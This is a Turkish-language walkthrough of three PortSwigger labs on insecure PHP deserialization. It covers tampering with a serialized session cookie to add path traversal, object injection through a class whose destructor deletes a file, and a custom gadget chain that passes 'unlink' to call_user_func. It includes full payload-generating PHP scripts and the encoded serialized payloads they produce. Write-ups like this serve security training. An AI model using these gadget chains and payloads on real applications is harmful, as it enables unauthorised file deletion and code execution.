<h1 align="center">Deserialization Exploitation</h1>

# Alıştırma #1

* https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-application-functionality-to-exploit-insecure-deserialization bu alıştırmayı açalım.

* Web sitesinde serialization tabanlı mekanizma kullanılıyormuş. Bunu kullanarak **Carlos** kullanıcısının **home** dizinindeki **morale.txt** isimli dosyayı silmemizi istiyor. Aşağıda da bunu kullanabileceğimiz hesaplar verilmiş. Devam edip wiener:peter hesabına giriş yapalım;

![alt text](<WebSec101 0x0D_ss/image.png>)

* Buradaki ekranda **intercept**'i açıp delete tuşuna basalım ve gelen kodu repeater'a yollayalım;

![alt text](<WebSec101 0x0D_ss/image-1.png>)

* **Decode** ekranındaki kodumuza bakalım;

* **O:4:"User":3:{s:8:"username";s:5:"gregg";s:12:"access_token";s:32:"fz7qtulcy79b48z1uuv8wbo933uae2b6";s:11:"avatar_link";s:18:"users/gregg/avatar";}** 

* Şimdi burada **session** bilgisine ulaşıyoruz. Dolayısıyla verileri manipüle edebiliriz. Kodu şöyle değiştirelim;

* **O:4:"User":3:{s:8:"username";s:5:"gregg";s:12:"access_token";s:32:"fz7qtulcy79b48z1uuv8wbo933uae2b6";s:11:"avatar_link";s:55:"../../../../../../../../../../../home/carlos/morale.txt";}**

* eklenen kısım: **../../../../../../../../../../../home/carlos/morale.txt** burada bize verilen adres kısmını carlosunkine işaret edecek şekilde değiştirdik. Çünkü alıştırmada morale.txt dosyasının carlos kullanıcısının home dizininde bulunduğunu söylemişti. Bunlardan önce de **../** şeklinde karakterler ekledik ki bundan önceki dosya dizinlerini temsil etsin diye. Çünkü biz **home** dizininden öncesini bilmiyoruz. Sonra da bu adresten önce gelen **s:18:** kısmını **s:55:** olarak değiştirdik çünkü bu yazdığımız adres **55 karakterden** oluşuyor. 

* Güncellediğimiz kodu repeater kısmındaki **session** kodu ile değiştirelim;

![alt text](<WebSec101 0x0D_ss/image-3.png>)

* Sonra hepsini seçip ctrl+b yapalım;

![alt text](<WebSec101 0x0D_ss/image-2.png>)

![alt text](<WebSec101 0x0D_ss/image-4.png>)

* Şimdi **send** tuşuna basalım ve alıştırmayı tamamlamış olalım;

# Alıştırma #2

* https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-arbitrary-object-injection-in-php

* Bu alıştırmada yine serialize tabanlı bir session mekanizması varmış ve **php object injection** tarafında bir zaafiyeti varmış. Yine carlosa ait **morale.txt** dosyasını silmemizi istiyor ama bu kez **object injection** yaparak. Bunun için de bu sitenin kaynak kodlarına ihtiyacımız var. Dolayısıyla önce kaynak koduna erişip sonra silme işlemini yapmamız gerekiyor.

* Siteye girelim ve **ctrl+u** yaparak sayfayı inceleyelim;

![alt text](<WebSec101 0x0D_ss/image-5.png>)

* Aşağı indiğimizde bir adres göreceğiz. Seçili şekildeki gibi kopyalayalım.

* Sonra wiener hesabına girip **burp suite** üzerinden bu **requesti** **repeater'a** yollayalım;

![alt text](<WebSec101 0x0D_ss/image-6.png>)

* Kopyaladığımız adresi yapıştırıp sonuna **~** işareti koyalım ki **response'da** kaynak koduna ulaşabilelim;

!![alt text](<WebSec101 0x0D_ss/image-7.png>)

* **Send** diyelim;

![alt text](<WebSec101 0x0D_ss/image-8.png>)

* Evet yapıştırdığımız adresteki kaynak koduna ulaşmış olduk. Bize verilen session'ı kopyalayıp onu vscode'a getirelim ve kaynak kodunundan esinlenerek şu şekilde bir kod yazalım;


```php

<?php

class CustomTemplate {
    var $template_file_path;
    var $lock_file_path;

}

class User {
    var $username;
    var $access_token;
}

$object = 'O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"unun5rfep22ynj6070m943pimtko8u8r";}';

$payload = new User();
$payload->access_token = 'unun5rfep22ynj6070m943pimtko8u8r';
$payload->username = new CustomTemplate();
$payload->username->lock_file_path = '../../../../../../../../../../../../../../../home/carlos/morale.txt';
$payload->username->template_file_path = 'test.txt';

echo urlencode(base64_encode(serialize($payload->username))); 

?>
``` 

* Yukarıda **CustomTemplate** isimli sınıfını ve property'lerini kaynak koddan olduğu gibi aldık ve private olan bu **propertyleri** **var** yazarak herkesin ulaşabileceği bir hale getirdik.

* Sonra aşağısına **User** sınıfını ekledik ve iki tane **property** verdik. Bu **propertyler** bizim sessionımızda gördüğümüz **username** ve **access_token** propertyleridir.

* Sonra aşağıya **object** isminde bir değişken tanımladık ve giriş yaptığımızda bize tanımlanmış ve decode edilmiş veriyi oraya girdik. 

* Bir aşağısına ise **user** sınıfını örnek alarak oluşturulan payload ekledik.

* Bunun altında **access_token** işaret ediliyor ve yine **session** verisinde yer alan **access token** kodunu buraya konuyor. 

* Sonra **payload** **username**'e işaret ediyor ve username'in altında bir **CustomTemplate** örneği tanımlanıyor. 

* Sonrasında **payload** username'e işaret ediyor ve username de **lock_file_path** özelliğine işaret ediyor. Bu özellikte de carlos'un morale.txt'si geçtiğimiz alıştırmadaki gibi tanımlanıyor. 

* Aşağıda da **template_file_path** özelliğine işaret ediliyor ve **test.txt** geçici değeri yazılıyor.

* En aşağıda da çıktıyı almak için payload kodu şifrelenmiş şekilde çağırılıyor ki bu kodu burp suite üzerindeki session ile değiştirip request yapalım. 

* Bu kodu çalıştırdığımızda çıktı olarak;

```php

Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtPOjE0OiJDdXN0b21UZW1wbGF0ZSI6Mjp7czoxODoidGVtcGxhdGVfZmlsZV9wYXRoIjtzOjg6InRlc3QudHh0IjtzOjE0OiJsb2NrX2ZpbGVfcGF0aCI7czo2NzoiLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7fXM6MTI6ImFjY2Vzc190b2tlbiI7czozMjoidW51bjVyZmVwMjJ5bmo2MDcwbTk0M3BpbXRrbzh1OHIiO30%3D 

``` 

* Şeklinde şifrelenmiş bir kod geliyor. Bunu kopyalayıp burpsuite üzerindeki bize verilen session kodu ile değiştirelim;

![alt text](<WebSec101 0x0D_ss/image-9.png>)

* **Send** tuşuna basalım ve alıştırmayı tamamlayalım. 

* Burada yaptığımız şey aslında temelinde session'daki verileri php kodu yazıp tekrardan çalıştırmak oldu. Çünkü kaynak kodundan aslında silme kodunun(destruct) nasıl çalıştığını görmüş olduk ve bizden istenen dosyayı basitçe silme koduna yönlendiren bir kod yazıp onu kullanmış olduk. Yani başka bir objenin property'sine istediğimiz dosyayı işaret ettirerek onunla etkileşime geçirdik. Bu durumda biz **morale.txt** dosyasını **CustomTempalate** objesinde silme işlemi yapan **lock_file_path** propertysine işaret ettirdik. Bunun literatürdeki karşılığı POP'dir. Yani **Property Oriented Programming(Özellik Odaklı Programlama)**

# Alıştırma #3 

* Sözlük
    * **gadget chain**: Bir uygulamadaki ya da kütüphanedeki saldırıya açık kod parçalarıdır. Bu kod parçaları saldırgan tarafından birleştirilip zincirleme şeklinde kullanılabilmektedir.
   


* https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-php-deserialization

* Alıştırmada yine serialization temelli bir mekanizma varmış. Bu kez **gadget chainler** oluşturarak **remote code execution(uzaktan saldırı)** yapmamızı istiyor. Bu saldırıyı kullanarak yine **morale.txt** dosyasını silmemizi istiyor.

* Siteye girelim ve bize verdiği **wiener** hesabına giriş yapalım.

* Yine kaynak koduna erişmemiz gerekecek. ctrl+u tuşuna basarak site kaynağına bakalım; 

![alt text](<WebSec101 0x0D_ss/image-10.png>)

* Seçili kodu kopyalayalım ve giriş yaptığımız **requesti** bulup **repeater'a** yollayalım;

![alt text](<WebSec101 0x0D_ss/image-11.png>)

* Kopyaladığımız adresi yapıştıralım ve sonuna yine **~** işaretini ekleyip send tuşuna basalım; 

![alt text](<WebSec101 0x0D_ss/image-12.png>)

* Kaynak kodlarına ulaştık.

* Bu kodlara daha yakından bakalım;

```php

<?php

class CustomTemplate {
    private $default_desc_type;
    private $desc;
    public $product;

    public function __construct($desc_type='HTML_DESC') {
        $this->desc = new Description();
        $this->default_desc_type = $desc_type;
        // Carlos thought this is cool, having a function called in two places... What a genius
        $this->build_product();
    }

    public function __sleep() {
        return ["default_desc_type", "desc"];
    }

    public function __wakeup() {
        $this->build_product();
    }

    private function build_product() {
        $this->product = new Product($this->default_desc_type, $this->desc);
    }
}

class Product {
    public $desc;

    public function __construct($default_desc_type, $desc) {
        $this->desc = $desc->$default_desc_type;
    }
}

class Description {
    public $HTML_DESC;
    public $TEXT_DESC;

    public function __construct() {
        // @Carlos, what were you thinking with these descriptions? Please refactor!
        $this->HTML_DESC = '<p>This product is <blink>SUPER</blink> cool in html</p>';
        $this->TEXT_DESC = 'This product is cool in text';
    }
}

class DefaultMap {
    private $callback;

    public function __construct($callback) {
        $this->callback = $callback;
    }

    public function __get($name) {
        return call_user_func($this->callback, $name);
    }
}

?>
``` 

* Böyle bir kaynak koduna bakarken bunu nasıl lehimize kullanabileceğimizi düşünmeliyiz. Birden fazla sınıf var ve içlerinde özellikler ve fonksiyonlar barındırıyor. Burada işimize yarayacak bir şeyler olmalı;

* **CustomTemplate** sınıfına ait bir kısım şu şekilde değiştiriliyor;

```php
public function __construct($desc_type='HTML_DESC') {
        $this->desc = new DefaultMap("unlink");  // new Description();
        $this->default_desc_type = $desc_type;
        // Carlos thought this is cool, having a function called in two places... What a genius
        $this->build_product();
    }
```

* Sadece **$this->desc = new Description();** olan kısım **$this->desc = new DefaultMap("unlink");** olarak değiştirildi. 

* DefaultMap sınıf örneği oluşturuldu. Bunun sebebi hedefimizin aslında o kısım olmasıdır. **DefaultMap** sınıfına daha yakından bakalım;

```php

class DefaultMap {
    private $callback;

    public function __construct($callback) {
        $this->callback = $callback;
    }

    public function __get($name) {
        return call_user_func($this->callback, $name);
    }
}

```

* Bu sınıfta **call_user_func** isimli bir fonksiyon var. Bu fonksiyona verilen bir string değeri çalıştırılabilir hale gelmektedir. Örneğin aşağıdaki kod çalışır;

```
call_user_func('system','id')
```

* Bu sefer kodun başka bir kısmına bakalım. Aşağıda **CustomTemplate** sınıfına ait **build_product** fonksiyonu ve **wakeup** fonksiyonu var.

```php

public function __wakeup() {
        $this->build_product();
    }

private function build_product() {
        $this->product = new Product($this->default_desc_type, $this->desc);
    }
```

* Burada **deserialization** yapılırken oluşabilecek bir zaafiyet söz konusu. Bu sınıfta wakeup metodu da çağrıldığı için fonksiyon kontrol dışı yeniden başlatılabilir ve bu da güvenlik riskini doğurur. 

* **build_product** fonksiyonu, **Product** sınıfını oluştururken **$this->desc** özelliğini kullanıyor. Buradaki **desc** özelliği bu kod sayesinde geri dönüştürülerek kullanılabilir çünkü **build product** fonksiyonu **construct** fonksiyonunun içinde de çağrılmış. 

* Şimdi yapılan değişiklerle birlikte kodu güncellemiş olalım;

```php
<?php

class CustomTemplate {
    private $default_desc_type;
    private $desc;
    public $product;

    public function __construct($desc_type='HTML_DESC') {
        $this->desc = new DefaultMap("unlink");  // new Description();
        $this->default_desc_type = $desc_type;
        // Carlos thought this is cool, having a function called in two places... What a genius
        $this->build_product();
    }

    public function __sleep() {
        return ["default_desc_type", "desc"];
    }

    public function __wakeup() {
        $this->build_product();
    }

    private function build_product() {
        $this->product = new Product($this->default_desc_type, $this->desc);
    }
}

class Product {
    public $desc;

    public function __construct($default_desc_type, $desc) {
        $this->desc = $desc->$default_desc_type;
    }
}

class Description {
    public $HTML_DESC;
    public $TEXT_DESC;

    public function __construct() {
        // @Carlos, what were you thinking with these descriptions? Please refactor!
        $this->HTML_DESC = '<p>This product is <blink>SUPER</blink> cool in html</p>';
        $this->TEXT_DESC = 'This product is cool in text';
    }
}

class DefaultMap {
    private $callback;

    public function __construct($callback) {
        $this->callback = $callback;
    }

    public function __get($name) {
        return call_user_func($this->callback, $name);
    }
}

$test = new CustomTemplate('../../../../../../../../../../../../../home/carlos/morale.txt');

echo urlencode(
    base64_encode(
    serialize($test)
    )
);

?>
``` 

* **test** isimli değişken oluşturuldu ve bundan **CustomTemplate** sınıf özelliği oluşturuldu. İçindeki string değeri ise  **morale.txt** adresini işaret ediyor. 

* Aşağısında ise bunun çıktısı şifreleniyor ki burpsuite'de kullanabilelim. Bu kodu çalıştırdığımızda çıktı olarak; 

```php
TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjI6e3M6MzM6IgBDdXN0b21UZW1wbGF0ZQBkZWZhdWx0X2Rlc2NfdHlwZSI7czo2MToiLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7czoyMDoiAEN1c3RvbVRlbXBsYXRlAGRlc2MiO086MTA6IkRlZmF1bHRNYXAiOjE6e3M6MjA6IgBEZWZhdWx0TWFwAGNhbGxiYWNrIjtzOjY6InVubGluayI7fX0%3D
```

* Böyle şifrelenmiş bir kod gelecektir. Şimdi bu kodu burpsuite'de bize verilen ile değiştirelim ve send tuşuna basalım;

![alt text](<WebSec101 0x0D_ss/image-13.png>)

![alt text](<WebSec101 0x0D_ss/image-14.png>)

* Böylelikle labı çözmüş olduk. Özetle burada kaynak kodlarına eriştik ve onları inceledik. Bizim bu kodu nasıl lehimize kullanacağımız da aslında yazılan kodların güvenlik açıkları ile ilgiliydi. Burada silmek istediğimiz dosyanın adresini sınıf örneği oluşturarak girdik. Oluşturduğumuz sınıf örneğinin içindeki fonksiyonlar da aslında bu dosyayı silmekte işlev görüyordu dolayısıyla amacımıza ulaşmış olduk. 



# KAYNAK

[Web Security 0x0D | Deserialization Exploitation](https://www.youtube.com/watch?v=kk43YwA6OFI&list=PLwP4ObPL5GY940XhCtAykxLxLEOKCu0nT&index=14)